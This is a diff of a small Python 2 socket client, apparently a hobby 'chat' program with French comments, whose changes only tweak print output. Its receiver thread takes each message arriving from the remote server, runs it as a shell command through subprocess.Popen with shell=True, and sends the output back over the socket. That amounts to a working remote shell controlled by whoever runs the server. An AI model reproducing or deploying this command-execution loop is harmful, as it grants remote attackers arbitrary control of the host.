@@ -13,7 +13,8 @@ print 'Connecting to %s port %s' % srvaddr
 clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 clientsocket.connect(srvaddr)
 print clientsocket
-
+print "ligne1"
+print "ligne2"
 def testMessage(self):
     if self == '':
         print "Contenu vide, ecrivez ^^ ! \n#FACEPALM\n"
@@ -42,7 +43,7 @@ class mytchatrecep(Thread):
                 data = clientsocket.recv(255)
                 #le 255 definit le nombre de caracteres envoye en une seule fois
                 if data != '':
-                    print '\nRecu : "%s"' % data
+                    print 'Recu : "%s"' % data
                     #p = Popen([data], stdin=PIPE, stdout=PIPE, bufsize=1)
                     #print p.stdout.readline(), # read the first line
                     #for i in range(10):
@@ -52,11 +53,13 @@ class mytchatrecep(Thread):
                     result = []
                     p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE)
                     #q = Popen(data, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+                    print p.stdout
                     for line in p.stdout:
-                        line = line.rstrip()
-                        print line
+                        #line = line.rstrip()
+
                         if line != '':
-                            clientsocket.sendall(line)
+                            print line,
+                            clientsocket.sendall(line,)
                             #clientsocket.sendall("EMPTY\n")
                             #print "EMPTY"
                         #else:
